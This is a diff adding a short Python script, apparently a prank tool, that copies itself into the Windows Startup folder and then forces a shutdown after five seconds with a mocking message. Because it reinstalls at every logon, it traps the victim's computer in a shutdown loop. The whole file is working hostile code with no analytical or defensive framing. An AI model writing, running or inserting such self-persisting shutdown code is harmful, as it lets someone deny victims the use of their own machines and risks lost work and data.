@@ -1,0 +1,24 @@
+import os
+import shutil
+import sys
+
+# Get the path to the current script
+current_file = os.path.realpath(sys.argv[0])
+
+# Get path to Windows startup folder
+startup_folder = os.path.join(
+    os.getenv('APPDATA'),
+    r'Microsoft\Windows\Start Menu\Programs\Startup'
+)
+
+# Path where the script will live in startup
+startup_script = os.path.join(startup_folder, 'loop_shutdown.py')
+
+# Copy to startup every time (overwrite to ensure it's there)
+try:
+    shutil.copyfile(current_file, startup_script)
+except Exception as e:
+    pass  # ignore if file is in use
+
+# Trigger the shutdown with 5-second delay and message
+os.system('shutdown /s /t 5 /c "LOL. Again. 😈🔥"')
